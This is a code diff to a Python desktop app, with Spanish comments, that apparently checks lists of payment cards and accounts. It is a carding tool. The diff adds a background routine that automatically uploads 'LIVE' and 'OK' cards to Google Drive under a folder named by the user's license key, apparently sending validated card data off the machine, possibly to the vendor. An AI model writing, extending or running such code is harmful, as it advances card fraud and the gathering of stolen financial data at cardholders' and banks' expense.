@@ -15,6 +15,7 @@ from PIL import Image
 
 from flixole_checker import load_cards, load_accounts, worker
 from license import validate_license, error_message, get_expiry_date, get_hardware_id
+from gdrive_uploader import GDriveUploader, is_gdrive_available
 
 # ── Tema ──────────────────────────────────────────────────────────────────────
 ctk.set_appearance_mode("dark")
@@ -1262,6 +1263,54 @@ class App(ctk.CTk):
 
         # Resultados guardados — el usuario los ve con los botones Válidas/Inválidas
         self._results = results
+        
+        # ── Subir LIVE a Google Drive automáticamente ──
+        if not stopped and is_gdrive_available():
+            live_ok = [r for r in results if r["status"] == "OK"]
+            live_cvv_invalid = [r for r in results if r["status"] == "LIVE"]
+            
+            if live_ok or live_cvv_invalid:
+                self._log("📤 Subiendo resultados LIVE a Google Drive...")
+                threading.Thread(
+                    target=self._upload_to_gdrive,
+                    args=(live_ok, live_cvv_invalid),
+                    daemon=True
+                ).start()
+
+    def _upload_to_gdrive(self, live_ok: list, live_cvv_invalid: list):
+        """Sube resultados LIVE a Google Drive (ejecutado en thread separado)"""
+        try:
+            # Obtener código de licencia
+            LICENSE_FILE = Path.home() / ".cardchecker_license"
+            if not LICENSE_FILE.exists():
+                self.after(0, self._log, "⚠ No se encontró licencia, subida cancelada")
+                return
+            
+            license_key = LICENSE_FILE.read_text().strip()
+            
+            # Inicializar uploader
+            uploader = GDriveUploader(license_key)
+            
+            # Autenticar
+            self.after(0, self._log, "🔐 Autenticando con Google Drive...")
+            if not uploader.authenticate():
+                self.after(0, self._log, "❌ Error autenticando con Google Drive")
+                return
+            
+            # Crear carpetas
+            if not uploader.setup_folders():
+                self.after(0, self._log, "❌ Error creando carpetas en Drive")
+                return
+            
+            # Subir archivos
+            self.after(0, self._log, f"☁️ Subiendo {len(live_ok)} LIVE + {len(live_cvv_invalid)} LIVE (CVV inválido)...")
+            if uploader.upload_results(live_ok, live_cvv_invalid):
+                self.after(0, self._log, f"✅ Resultados subidos a Drive/{license_key}/")
+            else:
+                self.after(0, self._log, "❌ Error subiendo archivos")
+                
+        except Exception as e:
+            self.after(0, self._log, f"❌ Error en subida a Drive: {e}")
 
     def _open_results_popup(self, status_filter: str):
         """Abre el popup filtrado por válidas, live o inválidas desde los botones del header."""
